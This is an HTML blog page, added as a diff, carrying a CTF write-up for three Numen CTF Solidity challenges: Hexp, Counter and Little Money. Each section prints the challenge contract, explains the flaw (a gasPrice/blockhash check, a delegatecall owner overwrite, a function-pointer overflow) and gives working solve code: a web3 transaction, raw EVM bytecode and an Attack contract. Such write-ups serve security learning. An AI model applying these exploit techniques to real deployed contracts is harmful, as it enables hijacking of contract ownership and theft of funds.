@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Numen CTF WriteUps </title>
+  <meta name="description" content="Building n Breaking">
+
+  <!-- Social: Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@D4r3_D3v1L_">
+  <meta name="twitter:title" content="Numen CTF WriteUps ">
+  <meta name="twitter:description" content="Building n Breaking">
+  
+  <meta property="twitter:image:src" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+
+  <!-- Social: Facebook / Open Graph -->
+  <meta property="og:url" content="http://localhost:4000/potato-hacker-theme/blog/2023/04/01/Numen-CTF.html">
+  <meta property="og:title" content="Numen CTF WriteUps ">
+  
+  <meta property="og:image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+  <meta property="og:description" content="Building n Breaking">
+  <meta property="og:site_name" content="jekyll-theme-potato-hacker">
+
+  <!-- Social: Schema.org  -->
+  <meta itemprop="name" content="Numen CTF WriteUps "/>
+  <meta itemprop="description" content="Building n Breaking">
+  <meta itemprop="image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png"/>
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/potato-hacker-theme/assets/img/icons/favicon.ico" type="image/x-icon" />
+
+  <!-- Android Lolipop Theme Color -->
+  <meta name="theme-color" content="#2a4d14">
+
+  <!-- Styles -->
+  <link rel="stylesheet" id="css-theme" href="/potato-hacker-theme/assets/css/main-dark.css">
+  <link rel="stylesheet" href="/potato-hacker-theme/assets/css/highlight/gruvbox.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">
+
+  <!-- Javascript -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
+  <script type="text/javascript" src="/potato-hacker-theme/assets/js/main.js"></script>
+</head>
+
+
+<body class="animated fadeIn">
+  <div class="container">
+    <div id="background-div">
+      <svg id="background-svg">
+        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
+          <stop stop-opacity="0" class="bgColor2" offset="0%" />
+          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
+          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
+          <stop stop-opacity="0" class="bgColor1" offset="100%" />
+        </lineargradient>
+        <g id="bg-layer1"></g>
+        <g id="bg-layer2" class="hide"></g>
+        <g id="bg-layer3"></g>
+        <g id="bg-layer4"></g>
+      </svg>
+    </div>
+    <section class="header">
+      <header>
+	<div class="row">
+		<div class="col-xs-12">
+			<nav class="navbar navbar-default navbar-fixed-top">
+				<div class="container">
+					<div class="navbar-header">
+						<a
+							class="navbar-toggle collapsed navbar-icon"
+							data-toggle="collapse"
+							data-target="#bs-example-navbar-collapse-1"
+						>
+							<i class="fa fa-bars fa-2x"></i>
+						</a>
+						<a
+							class="navbar-brand navbar-icon"
+							href="/potato-hacker-theme/"
+						>
+							<i class="fa fa-home fa-2x"></i>
+						</a>
+					</div>
+
+					<div
+						class="collapse navbar-collapse"
+						id="bs-example-navbar-collapse-1"
+					>
+						<ul class="nav navbar-nav navbar-right">
+							<li>
+								<a href="/potato-hacker-theme/"
+									>Home</a
+								>
+							</li>
+							
+							<li>
+								<a href="/potato-hacker-theme/blog"
+									>Blog</a
+								>
+							</li>
+							
+
+							<!-- 
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority="1"><a href="/potato-hacker-theme/dropdown/dropdown1_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority="2"><a href="/potato-hacker-theme/dropdown/dropdown1_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item3">
+                    <li priority="3"><a href="/potato-hacker-theme/dropdown/dropdown1_item3.html">item3</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown3">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown3
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown3_item1.html">item1</a></li>
+                  </ul>
+                </li>
+               -->
+							
+							<li class="nav-item">
+								<a
+									href="/potato-hacker-theme/items/about.html"
+									>About</a
+								>
+							</li>
+							
+
+							<script>
+								// clean repeated dropdowns and add <li> to their positions
+								let done = [];
+								let elements = [];
+								$(".dropdown")
+								  //
+								  .each((index0 , value0) => {
+								    let dropdownClass = "."+$(value0)[0].classList[1];
+								    if (done.indexOf(dropdownClass) !== -1) return
+								    done.push(dropdownClass)
+								    let dropdownMain = $(dropdownClass)[0]
+								    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
+								    $(dropdownClass+">ul>li").remove();
+								    $(dropdownClass+">ul").append(itemsList)
+								    $(dropdownClass).remove();
+								    elements.push(dropdownMain)
+								});
+								let priority = [ "About", ];
+								elements = elements.concat(...$(".nav-item").remove())
+								priority.map(text => {
+								  elements = elements.filter(node => {
+								      let nodeText = node.querySelector("a").textContent.trim()
+								      if (text == nodeText) {
+								          $(".nav").append(node)
+								          return false;
+								      }
+								      return true;
+								  })
+								});
+								$(".nav").append(elements)
+							</script>
+						</ul>
+					</div>
+				</div>
+			</nav>
+		</div>
+	</div>
+</header>
+
+    </section>
+    <section class="content">
+      <div class="row">
+        <!-- <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="left-pane">
+          </div>
+        </div> -->
+        <div class="col-sm-8 col-sm-offset-2 content-div">
+          <div class="page-separator hidden-xs">
+            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
+          </div>
+          <div class="page-separator visible-xs">
+            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
+          </div>
+          <h1 class="post-title page-title" id="title"><a href="#title">Numen CTF WriteUps </a></h1>
+          <h4 class="post-title"> 2023-04-01 14:38:12 +0530 </h4>
+<article class="blog-post">
+  <p>Numen CTF WriteUps</p>
+
+<!--more-->
+
+<h2 id="hexp">Hexp</h2>
+
+<p>Contract :</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Hexp</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="kr">immutable</span> <span class="n">target</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">flag</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">code</span> <span class="o">=</span> <span class="s">hex"3d602d80600a3d3981f362ffffff80600a43034016903a1681146016576033fe5b5060006000f3"</span><span class="p">;</span>
+        <span class="kt">address</span> <span class="n">child</span><span class="p">;</span>
+        <span class="k">assembly</span> <span class="p">{</span>
+            <span class="n">child</span> <span class="o">:=</span> <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="n">mload</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
+        <span class="p">}</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">child</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">f00000000_bvvvdlt</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">succ</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">ret</span><span class="p">)</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="s">hex""</span><span class="p">);</span>
+        <span class="nb">assert</span><span class="p">(</span><span class="n">succ</span><span class="p">);</span>
+        <span class="n">flag</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">flag</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to make the <code class="language-plaintext highlighter-rouge">flag</code> to true , for that we need to call the <code class="language-plaintext highlighter-rouge">f00000000_bvvvdlt()</code> function which calls the target contract which is created by our main contract using the bytecode.</p>
+
+<p>After decompiling the bytecode : <code class="language-plaintext highlighter-rouge">0x62ffffff80600a43034016903a1681146016576033fe5b5060006000f3</code> we get this.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">__function_selector__</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="nb">assert</span><span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="nb">blockhash</span><span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="n">number</span> <span class="o">-</span> <span class="mi">10</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span> <span class="o">==</span> <span class="n">msg</span><span class="p">.</span><span class="n">gas</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span><span class="p">);</span>
+    <span class="k">return</span> <span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>This contract checking the gasPrice of the transaction is equal to <code class="language-plaintext highlighter-rouge">block.blockhash(block.number - 10) &amp; 0xffffff</code> .</p>
+
+<p>Solution :</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span>
+	<span class="na">nonce</span><span class="p">:</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getTransactionCount</span><span class="p">(</span><span class="nx">player</span><span class="p">),</span>
+	<span class="c1">//our address</span>
+	<span class="na">from</span><span class="p">:</span> <span class="nx">player</span><span class="p">,</span>
+	<span class="c1">//contract address</span>
+	<span class="na">to</span><span class="p">:</span> <span class="nx">to_acc</span><span class="p">,</span>
+	<span class="na">value</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="na">gas</span><span class="p">:</span> <span class="mi">30000000</span><span class="p">,</span>
+	<span class="na">chainId</span><span class="p">:</span> <span class="mi">22574</span><span class="p">,</span>
+	<span class="c1">//calculating the blockhash of the blocknumber - 10 and adding some value to increase the gasPrice .</span>
+	<span class="na">gasPrice</span><span class="p">:</span>
+		<span class="nb">Number</span><span class="p">(</span>
+			<span class="nx">BigInt</span><span class="p">(</span>
+				<span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span>
+					<span class="p">(</span>
+						<span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getBlock</span><span class="p">(</span>
+							<span class="p">(</span><span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getBlockNumber</span><span class="p">())</span> <span class="o">-</span> <span class="mi">10</span>
+						<span class="p">)</span>
+					<span class="p">).</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+			<span class="p">)</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0xffffff</span><span class="dl">"</span><span class="p">)</span>
+		<span class="p">)</span> <span class="o">+</span> <span class="mh">0x1000000</span><span class="p">,</span>
+	<span class="c1">//functin signature of f00000000_bvvvdlt()</span>
+	<span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0x00000000</span><span class="dl">"</span><span class="p">,</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<h2 id="counter">Counter</h2>
+
+<p>Contract :</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Deployer</span> <span class="p">{</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">code</span><span class="p">)</span> <span class="p">{</span> <span class="k">assembly</span> <span class="p">{</span> <span class="k">return</span> <span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="n">mload</span><span class="p">(</span><span class="n">code</span><span class="p">))</span> <span class="p">}</span> <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">SmartCounter</span><span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">target</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">flag</span><span class="o">=</span><span class="nb">false</span><span class="p">;</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner_</span><span class="p">){</span>
+        <span class="n">owner</span><span class="o">=</span><span class="n">owner_</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">create</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">code</span><span class="p">)</span> <span class="k">public</span><span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">code</span><span class="p">.</span><span class="n">length</span><span class="o">&lt;=</span><span class="mi">24</span><span class="p">);</span>
+        <span class="n">target</span><span class="o">=</span><span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">Deployer</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">A_delegateccall</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">public</span><span class="p">{</span>
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">returnData</span><span class="p">)</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">owner</span><span class="o">==</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+        <span class="n">flag</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+        <span class="k">return</span> <span class="n">flag</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>To solve this challenge we need to set the <code class="language-plaintext highlighter-rouge">flag</code> to true , for that we need to call the <code class="language-plaintext highlighter-rouge">A_delegateccall</code> function and we should be the owner of the contract.</p>
+
+<p>Using the create function we can create the contract using bytecode later we are interacting with the same contract from the <code class="language-plaintext highlighter-rouge">A_delegateccall</code> function.</p>
+
+<p>The Deployer contract constructor creating a contract by taking the runtime bytecode .</p>
+
+<p>We can simply edit the owner variable in the original contract using the delegate call.</p>
+
+<p>For setting owner :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CALLER //msg.sender
+CALLVALUE //push 0x0
+SSTORE
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">0x333455</code></p>
+
+<p>Call the <code class="language-plaintext highlighter-rouge">create</code> function using this bytes will create a contract which stores the <code class="language-plaintext highlighter-rouge">msg.sender</code> value in the slot 0 .</p>
+
+<p>Calling the <code class="language-plaintext highlighter-rouge">A_delegateccall</code> function with any data will set the <code class="language-plaintext highlighter-rouge">flag</code> to true.</p>
+
+<h2 id="little-money">Little Money</h2>
+
+<p>Contract :</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">12</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Numen</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">private</span> <span class="n">owner</span><span class="p">;</span>
+
+    <span class="k">event</span> <span class="n">SendFlag</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+
+    <span class="k">constructor</span><span class="p">(){</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">struct</span> <span class="n">func</span><span class="p">{</span>
+        <span class="k">function</span><span class="p">()</span> <span class="k">internal</span> <span class="n">ptr</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">modifier</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
+        <span class="n">_</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">modifier</span> <span class="n">checkPermission</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">){</span>
+        <span class="n">_</span><span class="p">;</span>
+        <span class="n">permission</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">permission</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span><span class="k">internal</span> <span class="k">view</span><span class="p">{</span>
+        <span class="kt">bool</span> <span class="n">con</span> <span class="o">=</span> <span class="n">calcCode</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">con</span><span class="p">,</span><span class="s">"permission"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">addr</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">calcCode</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span><span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+        <span class="kt">uint</span> <span class="n">x</span><span class="p">;</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">x</span> <span class="o">:=</span> <span class="n">extcodesize</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span><span class="k">return</span> <span class="nb">false</span><span class="p">;}</span>
+        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">&gt;</span> <span class="mi">12</span><span class="p">){</span><span class="k">return</span> <span class="nb">false</span><span class="p">;}</span>
+        <span class="k">else</span><span class="p">{</span><span class="k">assembly</span><span class="p">{</span><span class="k">return</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">)}}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">execute</span><span class="p">(</span><span class="kt">address</span> <span class="n">target</span><span class="p">)</span> <span class="k">external</span> <span class="n">checkPermission</span><span class="p">(</span><span class="n">target</span><span class="p">){</span>
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="kt">bytes4</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">"func()"</span><span class="p">))));</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">,</span><span class="s">"no cover!"</span><span class="p">);</span>
+        <span class="kt">uint</span> <span class="n">b</span><span class="p">;</span>
+        <span class="kt">uint</span> <span class="n">v</span><span class="p">;</span>
+        <span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="o">=</span> <span class="n">getReturnData</span><span class="p">();</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">b</span> <span class="o">==</span> <span class="n">block</span><span class="p">.</span><span class="n">number</span><span class="p">);</span>
+
+        <span class="n">func</span> <span class="k">memory</span> <span class="n">set</span><span class="p">;</span>
+        <span class="n">set</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">renounce</span><span class="p">;</span>
+        <span class="k">assembly</span> <span class="p">{</span>
+            <span class="n">mstore</span><span class="p">(</span><span class="n">set</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="n">mload</span><span class="p">(</span><span class="n">set</span><span class="p">),</span><span class="n">v</span><span class="p">))</span>
+        <span class="p">}</span>
+        <span class="n">set</span><span class="p">.</span><span class="n">ptr</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">renounce</span><span class="p">()</span><span class="k">public</span><span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">owner</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">getReturnData</span><span class="p">()</span><span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">b</span><span class="p">,</span><span class="kt">uint</span> <span class="n">v</span><span class="p">){</span>
+        <span class="k">assembly</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="n">iszero</span><span class="p">(</span><span class="n">eq</span><span class="p">(</span><span class="n">returndatasize</span><span class="p">(),</span> <span class="mh">0x40</span><span class="p">))</span> <span class="p">{</span> <span class="nb">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">}</span>
+            <span class="kr">let</span> <span class="n">ptr</span> <span class="o">:=</span> <span class="n">mload</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+            <span class="n">returndatacopy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+            <span class="n">b</span> <span class="o">:=</span> <span class="n">and</span><span class="p">(</span><span class="n">mload</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="mh">0x00000000000000000000000000000000000000000000000000000000ffffffff</span><span class="p">)</span>
+            <span class="n">v</span> <span class="o">:=</span> <span class="n">mload</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="n">ptr</span><span class="p">))</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">payforflag</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">1</span><span class="p">,</span> <span class="s">'I only need a little money!'</span><span class="p">);</span>
+        <span class="k">emit</span> <span class="n">SendFlag</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+
+
+    <span class="k">receive</span><span class="p">()</span><span class="k">external</span> <span class="k">payable</span><span class="p">{</span>
+        <span class="nb">this</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">fallback</span><span class="p">()</span><span class="k">external</span> <span class="k">payable</span><span class="p">{</span>
+        <span class="nb">revert</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>The objective is to call the SendFlag() function present in payforflag(), but it is restricted with the onlyOwner modifier. Despite the availability of the renounce() function, it can only set the owner to address(0) and cannot be used to set it to any other address.</p>
+
+<p>The execute() function contains inline assembly code that enables us to modify the jump destination of the ptr property of the set struct that resides in the memory.</p>
+
+<p>By manipulating the value of v, we can control the jump destination that will be affected. However, execute() initiates a delegatecall to the target address, with the expectation of it failing, which means we cannot use the delegatecall to modify the owner address. Instead, we can cause a revert with b and v as the error message. Here, b is the block number, and v will influence the jump destination.</p>
+
+<p>In addition, execute() contains a checkPermission modifier that executes the permission() function after the content of the execute() function has been executed. This verifies that our target address has bytecode not exceeding 12 bytes and cannot be empty.</p>
+
+<p>The return in the assembly of calcCode() will stop the execution of the modifier.</p>
+
+<p>Our objective is to jump to 0x1f5 to trigger SendFlag, but there is a complication: the value of v is being added to 0x22a, which is larger than the target jump destination. However, this is not a problem since the addition is performed in inline assembly without any protection for overflow/underflow, so we can simply overflow it to get to 0x1f5.</p>
+
+<p>To achieve this, we can use the following sequence of opcodes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstore(0, block.number)
+mstore(0x20, NOT 0x34)
+revert(0, 0x40)
+</code></pre></div></div>
+
+<p>Additionally, we push 0 to the stack using the callvalue opcode (since its value is 0), instead of using push1 which requires an extra bytecode. We also push the value 0x20 to the stack and use the msize opcode to determine the amount of memory that will be accessed (0x40 in this case).</p>
+
+<p>The bytecode of 12 size will be <code class="language-plaintext highlighter-rouge">0x4334526034196020525934fd</code>. Use this to create a contract and use the cc address to pass in execute() method.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Attack</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">cc</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="n">deployMinimal</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="s">hex"6b4334526034196020525934fd600052600c6014f3"</span><span class="p">;</span>
+        <span class="kt">address</span> <span class="n">addr</span><span class="p">;</span>
+        <span class="k">assembly</span> <span class="p">{</span>
+            <span class="n">addr</span> <span class="o">:=</span> <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="n">bytecode</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="mh">0x15</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">addr</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+        <span class="n">cc</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+</article>
+
